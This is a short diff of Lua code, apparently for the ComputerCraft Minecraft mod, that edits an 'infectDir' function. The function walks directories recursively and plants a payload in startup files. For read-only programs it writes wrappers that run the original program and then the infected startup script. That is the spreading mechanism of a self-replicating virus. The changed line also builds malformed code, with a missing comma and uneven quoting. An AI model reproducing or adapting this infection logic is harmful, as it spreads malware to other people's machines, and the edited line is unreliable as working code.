@@ -59,7 +59,7 @@ function infectDir(dirName, payload)
         infectDir(fullFile, payload)
       elseif fs.isReadOnly(fullFile) then
         if file ~= "startup" then
-          dump = 'shell.run("' .. fullFile .. '")\n'
+          dump = 'shell.run("' .. fullFile .. '" ' .. arg .. ")\n"
           dump = dump .. 'shell.run("/startup")'
         else
           dump = payload
